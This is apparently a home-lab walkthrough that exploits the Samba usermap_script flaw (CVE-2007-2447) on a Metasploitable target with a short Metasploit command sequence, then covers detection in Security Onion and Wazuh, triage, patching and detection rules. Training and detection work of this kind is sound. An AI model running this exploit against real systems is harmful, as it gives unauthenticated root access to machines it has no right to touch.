# 05 — Samba usermap_script (RCE)

**MITRE ATT&CK:** T1190 Exploit Public-Facing Application · **CVE-2007-2447**
**Attacker:** Kali · **Target:** Metasploitable Samba `10.0.40.222:139/445` · **Detection:** Security Onion + Wazuh

A command-injection flaw in Samba's `username map script` lets shell metacharacters in a username execute as root — no authentication required. Pairs well with the vsftpd demo to show a second independent RCE path, this time over SMB.

---

## 1. The attack

Public Metasploit module against the training target:
```
msfconsole
use exploit/multi/samba/usermap_script
set RHOSTS 10.0.40.222
run
```
Success yields a root shell over the SMB service.

![Samba exploit shell](./01-samba-exploit.png)
> 📸 *Capture: Metasploit session opened and `whoami`/`id` showing root.*

---

## 2. Detection

**Security Onion (Suricata)** — ET signatures cover the Samba usermap command-injection attempt. Filter SO **Alerts** to the Kali source and SMB ports; Zeek `smb`/`conn` logs in **Hunt** show the session and any resulting shell traffic.

![Suricata Samba alert](./02-securityonion-samba-alert.png)
> 📸 *Capture: SO Suricata alert for the Samba usermap exploit + the SMB session in Hunt.*

**Wazuh** — Samba/auth logs on the vuln-host agent record the malformed login and the process activity from the injected command.

![Wazuh Samba/host event](./03-wazuh-host-event.png)
> 📸 *Capture: Wazuh events from the vuln-host agent at exploit time.*

---

## 3. Triage

Confirmed root compromise over SMB. Capture source IP, time, and post-exploit actions. SMB is a high-priority protocol to watch (it's also the lateral-movement workhorse in AD environments — tie this to walkthrough 06/07). Open a case; treat the host as owned.

---

## 4. Mitigation & remediation

- **Patch Samba** — the definitive fix.
- **Disable/secure the `username map script`** option; avoid unauthenticated SMB.
- **Restrict SMB (139/445)** to only hosts that need it; never expose it broadly.
- **Network segmentation** so a shelled host can't reach the rest of the estate.
- **Rebuild** confirmed-compromised hosts.

---

## 5. Detection engineering

- Keep ET rules current for the usermap sig; alert on shell-spawning processes parented by `smbd` (Wazuh/Sysmon-style logic on Linux via auditd).
- Add auditd execution logging on the target and a Wazuh rule for `smbd` → `/bin/sh` parent-child chains.

---

## Screenshots checklist
- [ ] `01-samba-exploit.png` — Metasploit root shell
- [ ] `02-securityonion-samba-alert.png` — Suricata alert + SMB session
- [ ] `03-wazuh-host-event.png` — Wazuh host-side events
